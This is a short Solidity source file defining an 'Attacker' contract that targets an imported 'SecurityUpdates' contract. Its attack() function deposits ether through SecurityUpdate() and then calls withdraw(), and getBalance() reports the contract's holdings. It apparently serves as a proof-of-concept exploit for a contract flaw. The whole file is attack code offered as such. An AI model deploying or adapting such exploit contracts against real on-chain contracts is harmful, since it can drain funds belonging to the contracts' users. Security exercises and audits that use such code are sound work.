pragma solidity ^0.4.26;

import "./SecurityUpdates.sol";

contract Attacker {
    SecurityUpdates private vulnerableContract;

    constructor(address _vulnerableContract) public {
        vulnerableContract = SecurityUpdates(_vulnerableContract);
    }

    function () public payable {
    }

    function attack() public payable {
        vulnerableContract.SecurityUpdate.value(msg.value)();
        vulnerableContract.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}